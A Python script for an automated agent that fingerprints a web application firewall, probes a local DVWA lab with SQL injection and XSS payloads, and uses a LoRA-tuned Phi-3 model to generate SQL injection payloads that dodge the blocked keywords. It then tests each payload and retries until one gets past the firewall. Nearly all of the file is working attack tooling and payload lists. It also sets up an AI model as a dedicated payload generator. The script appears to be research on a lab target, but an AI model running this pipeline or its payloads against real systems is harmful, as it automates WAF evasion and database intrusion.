
import os
import subprocess
import json
from pathlib import Path
import httpx
import re
import asyncio
import torch
from transformers import AutoTokenizer, AutoModelForCausalLM, BitsAndBytesConfig
from peft import PeftModel, PeftConfig, LoraConfig
from langchain_core.prompts import PromptTemplate

# --- Config ---
DVWA_BASE_URL = "http://localhost:8080"
DVWA_LOGIN_URL = f"{DVWA_BASE_URL}/login.php"
DVWA_SQLI_URL = f"{DVWA_BASE_URL}/vulnerabilities/sqli/"
DVWA_XSS_URL = f"{DVWA_BASE_URL}/vulnerabilities/xss_r/"
USERNAME = "admin"
PASSWORD = "password"
ADAPTER_DIR = "experiments/red_phi3_mini_lora_adapter/adapter"
BASE_MODEL_NAME = "microsoft/Phi-3-mini-4k-instruct"
USE_ADAPTER = True # Set to True to load the fine-tuned adapter, False to use the base model directly

# --- Tool Implementations ---

def run_wafw00f(target_url: str) -> dict:
    print("[Tool] Running wafw00f...")
    try:
        command = f"bash -c 'source .venv/bin/activate && wafw00f {target_url}'"
        result = subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
        output = result.stdout
        is_behind_waf = "seems to be behind a WAF" in output
        waf_info = {"is_behind_waf": is_behind_waf, "details": output}
        print("[Tool] wafw00f completed successfully.")
        return waf_info
    except Exception as e:
        print(f"[Tool] ERROR: wafw00f failed: {e}")
        return {"error": "wafw00f execution failed", "details": str(e)}

async def run_probing() -> dict:
    """
    Performs basic SQLi and XSS probing to see what the WAF blocks.
    Includes a retry mechanism and a simplified regex for debugging.
    """
    print("[Tool] Running Probing...")
    cookies = httpx.Cookies()
    login_success = False
    max_retries = 3
    
    for attempt in range(max_retries):
        try:
            with httpx.Client(follow_redirects=True, cookies=cookies, timeout=15.0) as client:
                r = client.get(DVWA_LOGIN_URL)
                r.raise_for_status()
                
                m = re.search(r"user_token' value='([a-f0-9]{32})'", r.text, re.I)
                
                if not m:
                    raise Exception("Failed to find user_token.")

                token = m.group(1)
                data = {"username": USERNAME, "password": PASSWORD, "user_token": token, "Login": "Login"}
                r = client.post(DVWA_LOGIN_URL, data=data)
                r.raise_for_status()
                if "login.php" in str(r.url): raise Exception("Login failed.")
            login_success = True
            print(f"[Tool] Probing: DVWA login successful on attempt {attempt + 1}.")
            break
        except Exception as e:
            print(f"[Tool] WARNING: Probing login attempt {attempt + 1}/{max_retries} failed: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(2)
    
    if not login_success:
        return {"error": "Probing login failed after multiple retries."}

    sqli_payloads = {
        "' OR 1=1--": "OR",
        "' UNION SELECT 1,2--": "UNION",
        "' AND 1=1--": "AND",
        "' SLEEP(5)--": "SLEEP",
        "' BENCHMARK(1000000,MD5(1))--": "BENCHMARK",
        "' EXTRACTVALUE(1,CONCAT(0x5c,USER()))--": "EXTRACTVALUE",
        "' UPDATEXML(1,CONCAT(0x2e,USER()),1)--": "UPDATEXML",
        "' SELECT USER()--": "SELECT_USER",
        "' FROM users--": "FROM_USERS",
        "' WHERE 1=1--": "WHERE_1=1",
    }
    xss_payloads = {"<script>alert(1)</script>": "script_tag"}
    probe_results = {"blocked_sqli_keywords": [], "blocked_xss_tags": []}

    async with httpx.AsyncClient(cookies=cookies, follow_redirects=True) as client:
        for payload, name in sqli_payloads.items():
            r = await client.get(DVWA_SQLI_URL, params={"id": payload}, timeout=10.0)
            if r.status_code == 403:
                probe_results["blocked_sqli_keywords"].append(name)
        for payload, name in xss_payloads.items():
            r = await client.get(DVWA_XSS_URL, params={"name": payload}, timeout=10.0)
            if r.status_code == 403:
                probe_results["blocked_xss_tags"].append(name)
                
    print("[Tool] Probing completed successfully.")
    return probe_results

def run_generation(probe_results: dict, attack_history: list) -> str:
    print("[Tool] Running Generation...")
    
    blocked_keywords = probe_results.get("blocked_sqli_keywords", [])
    
    failed_attempts_prompt = ""
    if attack_history:
        failed_attempts_prompt += "\n\n**Previous Failed Attempts:**"
        for attack in attack_history:
            if attack.get("result") == "blocked":
                failed_attempts_prompt += f"\n- Payload: '{attack['payload']}' was BLOCKED by WAF."
            elif attack.get("result") == "sql_error_bypass":
                failed_attempts_prompt += f"\n- Payload: '{attack['payload']}' caused a SQL ERROR (WAF bypassed, but payload failed at DB level)."
            elif attack.get("result") == "passed":
                failed_attempts_prompt += f"\n- Payload: '{attack['payload']}' PASSED (no WAF block, no obvious SQL error, but no clear success)."

    tok = AutoTokenizer.from_pretrained(BASE_MODEL_NAME)
    if tok.pad_token is None: tok.pad_token = tok.eos_token
    tok.padding_side = "left"
    bnb = BitsAndBytesConfig(load_in_4bit=True, bnb_4bit_quant_type='nf4', bnb_4bit_use_double_quant=True, bnb_4bit_compute_dtype=torch.float16)
    base = AutoModelForCausalLM.from_pretrained(BASE_MODEL_NAME, device_map='auto', quantization_config=bnb, torch_dtype=torch.float16)
    
    if USE_ADAPTER:
        peft_config_dict = PeftConfig.from_json_file(os.path.join(ADAPTER_DIR, "adapter_config.json"))
        peft_config = LoraConfig(**peft_config_dict)
        model = PeftModel(base, peft_config)
    else:
        model = base # Use the base model directly
    model.eval()

    MAX_GENERATION_RETRIES = 3
    for retry_count in range(MAX_GENERATION_RETRIES):
        current_failed_attempts_prompt = failed_attempts_prompt
        if retry_count > 0:
            current_failed_attempts_prompt += f"\n\n**Feedback:** Your previous payload contained blocked keywords. Generate a new, fundamentally different payload that strictly avoids: {blocked_keywords}."

        # Construct the user message content
        user_message_content = (
            "You are a WAF penetration testing expert. Your goal is to craft a SQL injection payload that bypasses the target WAF.\n\n"
            "**Analysis of Target WAF:**\n"
            "- A generic WAF is present.\n"
            f"- Probing shows that the WAF **STRICTLY BLOCKS** payloads containing these SQL keywords: {blocked_keywords}.\n"
            f"{current_failed_attempts_prompt}\n\n"
            "**Your New Goal:**\n"
            "Generate a single, effective SQL injection payload. This payload **MUST NOT** contain any of the following keywords: "
            f"{blocked_keywords}. It must also be **fundamentally different** from any previously failed payloads.\n\n"
            "Write the final payload on a new line, prefixed with \"Payload:\". **The Payload line MUST ONLY contain the payload itself, with no additional text or reasoning.**\n"
            "**FINAL CHECK:** Before outputting, ensure the payload strictly avoids all blocked keywords and is syntactically valid for SQL injection.\n"
        )

        prompt = (
            "<|begin_of_text|>"
            "<|system|>\n"
            "You are a helpful AI assistant specialized in WAF penetration testing. Your task is to generate SQL injection payloads and reasoning based on the provided instructions and WAF analysis.<|end|>\n"
            "<|user|>\n"
            f"{user_message_content.strip()}<|end|>\n"
            "<|assistant|>\n"
        )
        print(f"[Tool] Generation prompt (Retry {retry_count + 1}/{MAX_GENERATION_RETRIES}):\n{prompt}")

        inputs = tok(prompt, return_tensors='pt').to(model.device)
        with torch.no_grad():
            out = model.generate(**inputs, max_new_tokens=256, do_sample=True, temperature=0.8, top_p=0.9, pad_token_id=tok.eos_token_id)
        text = tok.decode(out[0], skip_special_tokens=True)

        try:
            # Extract only the assistant's response part for Phi-3
            assistant_response_start = text.rfind("<|assistant|>")
            if assistant_response_start != -1:
                text = text[assistant_response_start + len("<|assistant|>"):].strip()
            
            # Check if the model echoed the prompt instructions, which might not include "Payload:"
            if "Payload:" not in text and any(rule in text for rule in ["Think step-by-step", "CRITICAL: Review the `blocked_keywords`"]):
                print("[Tool] WARNING: Model echoed prompt instructions instead of generating payload. Retrying.")
                continue # Retry generation
            
            payload = text.split("Payload:")[-1].strip().splitlines()[0].strip()
            if not payload: # If payload is empty after splitting
                print("[Tool] ERROR: Generation failed to produce a valid payload (empty after parsing). Retrying.")
                continue # Retry generation

            # Post-generation check for blocked keywords
            contains_blocked = False
            for keyword in blocked_keywords:
                if keyword.lower() in payload.lower():
                    print(f"[Tool] WARNING: Generated payload '{payload}' contains blocked keyword '{keyword}'. Retrying.")
                    contains_blocked = True
                    break
            
            if contains_blocked:
                # Add feedback to the prompt for the next retry
                if "Feedback:" not in failed_attempts_prompt:
                    failed_attempts_prompt += f"\n\n**Feedback:** Your previous payload contained blocked keywords. Generate a new, fundamentally different payload that strictly avoids: {blocked_keywords}."
                else:
                    # Update existing feedback
                    failed_attempts_prompt = re.sub(r"\*\*Feedback:\*\*(.*?)\n\n", f"**Feedback:** Your previous payload contained blocked keywords. Generate a new, fundamentally different payload that strictly avoids: {blocked_keywords}.\n\n", failed_attempts_prompt, 1)
                continue # Retry generation
            
            print(f"[Tool] Generation successful. New payload: {payload}")
            return payload
        except IndexError:
            print("[Tool] ERROR: Generation failed to produce a payload. Retrying.")
            continue # Retry generation
    
    print(f"[Tool] ERROR: Failed to generate a compliant payload after {MAX_GENERATION_RETRIES} retries.")
    return ""

async def run_testing(payload: str) -> dict:
    """
    Tests a single payload against the DVWA SQLi endpoint.
    Now includes basic SQL error detection in the response body.
    """
    print(f"[Tool] Running Testing for payload: {payload}")
    
    cookies = httpx.Cookies()
    try:
        with httpx.Client(follow_redirects=True, cookies=cookies, timeout=15.0) as client:
            r = client.get(DVWA_LOGIN_URL)
            r.raise_for_status()
            m = re.search(r"user_token' value='([a-f0-9]{32})'", r.text, re.I)
            if not m: raise Exception("Failed to find user_token for testing.")
            token = m.group(1)
            data = {"username": USERNAME, "password": PASSWORD, "user_token": token, "Login": "Login"}
            r = client.post(DVWA_LOGIN_URL, data=data)
            r.raise_for_status()
            if "login.php" in str(r.url): raise Exception("Login failed during testing.")
    except Exception as e:
        return {"error": "Testing failed during login", "details": str(e)}

    async with httpx.AsyncClient(cookies=cookies, follow_redirects=True) as client:
        r = await client.get(DVWA_SQLI_URL, params={"id": payload}, timeout=10.0)
        
        # Check for WAF block first
        if r.status_code == 403:
            print("[Tool] Testing result: BLOCKED by WAF")
            return {"result": "blocked"}
        
        # If not blocked by WAF, check for SQL errors in the response body
        sql_error_patterns = [
            r"You have an error in your SQL syntax",
            r"Warning: mysql_fetch_array\(\)",
            r"supplied argument is not a valid MySQL result resource",
            r"SQLSTATE\{",
            r"Unclosed quotation mark",
            r"ODBC SQL Server Driver",
            r"Microsoft OLE DB Provider for SQL Server",
            r"Incorrect syntax near",
            r"ORA-\d{5}", # Oracle errors
            r"PostgreSQL error",
            r"pg_query\(\) ",
            r"SQLite error",
            r"syntax error at or near",
            r"mysql_num_rows\(\) ",
            r"mysql_fetch_assoc\(\) ",
            r"mysql_result\(\) ",
            r"DB_ERROR",
            r"SQL Error",
            r"Fatal error: Uncaught PDOException",
            r"\[SQLSTATE",
        ]
        
        response_text = r.text.lower() # Convert to lower for case-insensitive search
        for pattern in sql_error_patterns:
            if re.search(pattern.lower(), response_text):
                print("[Tool] Testing result: SQL ERROR DETECTED (WAF bypassed)")
                return {"result": "sql_error_bypass"} # New result type
        
        # If no WAF block and no SQL error, it's a generic pass (might be no effect or successful blind)
        print("[Tool] Testing result: PASSED (No WAF block, no obvious SQL error)")
        return {"result": "passed"}

# --- Orchestrator Logic ---
def decide_next_step(state: dict) -> str:
    print("\n[Orchestrator] Deciding next step...")
    MAX_ATTEMPTS = 3
    
    if not state.get("waf_info"):
        return "run_wafw00f"
    if state.get("waf_info", {}).get("error"):
        print("[LLM Decision] WAF detection failed. Stopping.")
        return "stop"

    if not state.get("probe_results"):
        return "run_probing"
    if state.get("probe_results", {}).get("error"):
        print(f"[LLM Decision] Probing failed: {state['probe_results'].get('error')}. Stopping.")
        return "stop"

    for attack in state.get("attack_history", []):
        if attack.get("result") == "not_tested":
            print("[LLM Decision] Untested payload found. Recommended tool: 'run_testing'")
            return "run_testing"

    if state.get("attack_history"):
        last_attack = state["attack_history"][-1]
        # Only stop if a meaningful SQL error bypass is achieved
        if last_attack.get("result") == "sql_error_bypass":
            print(f"[LLM Decision] Attack successful with payload: '{last_attack['payload']}'. Stopping.")
            return "stop"
        
        # If it was merely 'passed' (no WAF block, no obvious SQL error), or 'blocked', continue trying
        if len(state["attack_history"]) < MAX_ATTEMPTS:
            print("[LLM Decision] Last attack failed or had no observable effect. Looping back to generation.")
            return "run_generation"
        else:
            print(f"[LLM Decision] Max attempts ({MAX_ATTEMPTS}) reached. Stopping.")
            return "stop"

    if not state.get("attack_history"):
        print("[LLM Decision] WAF rules analyzed. Recommended tool: 'run_generation'")
        return "run_generation"
    
    return "stop"

class Orchestrator:
    def __init__(self, target_url: str):
        self.state = {"target_url": target_url, "waf_info": None, "probe_results": None, "attack_history": []}
        self.tools = {
            "run_wafw00f": self.tool_run_wafw00f,
            "run_probing": self.tool_run_probing,
            "run_generation": self.tool_run_generation,
            "run_testing": self.tool_run_testing,
        }
        print(f"[Orchestrator] Initialized for target: {self.state['target_url']}")
    def tool_run_wafw00f(self): self.state["waf_info"] = run_wafw00f(self.state["target_url"])
    def tool_run_probing(self): self.state["probe_results"] = asyncio.run(run_probing())
    def tool_run_generation(self):
        new_payload = run_generation(self.state["probe_results"], self.state["attack_history"])
        self.state["attack_history"].append({"payload": new_payload, "result": "not_tested"})
    def tool_run_testing(self):
        for i, attack in enumerate(self.state["attack_history"]):
            if attack.get("result") == "not_tested":
                test_result = asyncio.run(run_testing(attack["payload"]))
                self.state["attack_history"][i].update(test_result)
                break
    def run(self):
        while True:
            next_tool_name = decide_next_step(self.state)
            if next_tool_name == "stop": break
            tool_to_run = self.tools.get(next_tool_name)
            if tool_to_run: tool_to_run()
            else: break

def main():
    orchestrator = Orchestrator(DVWA_BASE_URL)
    orchestrator.run()

if __name__ == "__main__":
    main()
